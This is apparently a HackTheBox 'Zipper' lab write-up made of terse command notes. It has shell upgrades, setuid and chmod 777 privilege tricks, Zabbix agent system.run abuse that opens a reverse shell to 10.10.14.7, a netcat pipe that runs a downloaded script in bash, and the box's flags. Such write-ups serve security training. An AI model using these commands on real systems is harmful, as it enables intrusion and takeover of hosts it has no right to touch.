# HackTheBox Zipper Writeup

![date](https://img.shields.io/badge/date-02.27.2019-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)  
![web category](https://img.shields.io/badge/category-web-lightgrey.svg)
![score](https://img.shields.io/badge/score-0-blue.svg)
![solves](https://img.shields.io/badge/solves-3144-brightgreen.svg)

## Detailed Solution


### Improve Shell

#### Method 1 

      > python -c 'import pty;pty.spawn("/bin/bash")'
      
      Then Press Crtl-Z
      > stty raw -echo
      > fg
      
#### Method 2      
      
      > script -q /dev/null
      
      Then Press Crtl-Z
      > stty raw -echo
      > fg
      > reset
      > export TERM=xterm
      
#### Enable UID Bit      
      > chmod 4755 /usr/bin/bash
      
      > chmod 4755 /usr/bin/vi
      > PATH=/tmp:$PATH
      > echo PATH
      > export PATH

#### Change Directory or File RW Permissions.
      box> vi /etc
      box> chmod 777

#### Exploit Zabbix Agent API to get Remote Code Execution     
      
      jason> tcpdump -i tun0 icmp
      box> echo "system.run[ping -c 1 10.10.14.7]" | nc 172.17.0.1
      
      > echo "system.run[bash -c 'nohup bash -i >& /dev/tcp/10.10.14.7/9002 0>&1 &']" | nc 172.17.0.1 10050

#### SSH to Zapper User
      
      jason> chmod 600 zapper.pem
      jason> ssh -i zapper.pem zapper@10.10.10.108

#### Ltrace zabbix-service      
      box> ltrace ./zabbix-service



      
#### LinEnum.sh
      jason> nc -lvnp 8000 < LinEnum.sh
      box> nc 10.10.14.7 8000 | bash

#### Flags      
      user Flag: aa29e93f48c64f8586448b6f6e38fe33
      root Flag: a7c743d35b8efbedfd9336492a8eab6e
#### Bonus      
Remove all spaces in a file.      
      > sed 's/  //g' -i file
      
      
